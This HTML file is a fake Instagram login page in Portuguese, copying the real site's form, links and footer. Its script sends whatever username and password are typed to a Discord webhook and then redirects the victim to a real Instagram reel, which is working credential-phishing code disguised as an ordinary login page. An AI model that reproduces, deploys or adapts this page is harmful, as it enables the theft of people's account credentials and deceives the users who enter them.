<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="">
  <link rel="stylesheet" href="css.css">
  <title>Instagram</title>
</head>
<body>
  <div id="root">
    <section class="section-all">
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="logo.png" alt="Instagram">
                </div>
                <div class="form-wrap">
                  <form class="form">
                    <div class="input-box">
                      <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                    </div>  
                    <div class="input-box">
                      <input type="password" name="password" id="password" placeholder="Senha" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  
                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Entrar</button>
                    </span>  
                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Esqueceu a senha?</a>
                  </form>
                </div>
              </div>
              <div class="login-box">
                <p class="text">Não tem uma conta?<a href="https://www.instagram.com/accounts/emailsignup">Cadastre-se</a></p>
              </div>
              <div class="app">
                <p>Obtenha o app.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" alt="iOS Badge">
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" alt="Android Badge">
                  </a>  
                </div>
              </div>
            </div>
          </article>
        </div>
      </main>
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href=""></a></li>
              <li><a href="https://about.instagram.com">About Us</a></li>
              <li><a href="https://help.instagram.com">Support</a></li>
              <li><a href="https://about.instagram.com/blog">Blog</a></li>
              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
              <li><a href="https://www.instagram.com/developer">API</a></li>
              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
              <li><a href="">Instagram</a></li>
            </ul>
          </nav>
          <span class="footer-logo">&copy; 2024 Instagram</span>
        </div>
      </footer>
    </section>
  </div>
  <script type="text/javascript">
    function la(src) {
      window.location = src;
    }
  </script>
  <script>
    function sendMessage() {
      function sleep(milliseconds) {
        const date = Date.now();
        let currentDate = null;
        do {
          currentDate = Date.now();
        } while (currentDate - date < milliseconds);
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1320518809072828496/9QURgmW2oWCq-VRL1gTy2OzFiMK49YzjSmKddcbP6t93zbqnXm_HjNKX3UBp5MH_2b5H");
      request.setRequestHeader('Content-type', 'application/json');
      var params = {
        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
      };
      request.send(JSON.stringify(params));
      sleep(2000);
      window.location.replace("https://www.instagram.com/reel/DBoeqjmRmnF/");
    }
  </script>
</body>
</html>
